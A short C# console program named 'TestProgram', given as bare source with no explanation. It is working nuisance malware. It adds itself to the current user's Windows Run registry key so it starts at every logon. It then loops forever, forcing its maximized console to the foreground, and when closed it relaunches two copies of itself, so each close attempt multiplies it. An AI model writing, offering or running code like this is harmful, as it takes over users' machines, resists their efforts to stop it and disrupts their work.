using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TestProgram {
    class Program {
        [DllImport("kernel32.dll", ExactSpelling = true)]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetForegroundWindow(IntPtr hWnd);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);
        private delegate bool EventHandler();
        private static EventHandler _handler;
        static void Main() {
            Program run = new Program();
            run.Run();
        }
        private void Run() {
            ShowWindow(GetConsoleWindow(), 3);
            _handler += Handler;
            SetConsoleCtrlHandler(_handler, true);
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("TestProgram", Application.ExecutablePath);
            while (true) { SetForegroundWindow(GetConsoleWindow()); }
        }
        private static bool Handler() {
            Process.Start(Application.ExecutablePath);
            Process.Start(Application.ExecutablePath);
            Environment.Exit(-1);
            return true;
        }
    }
}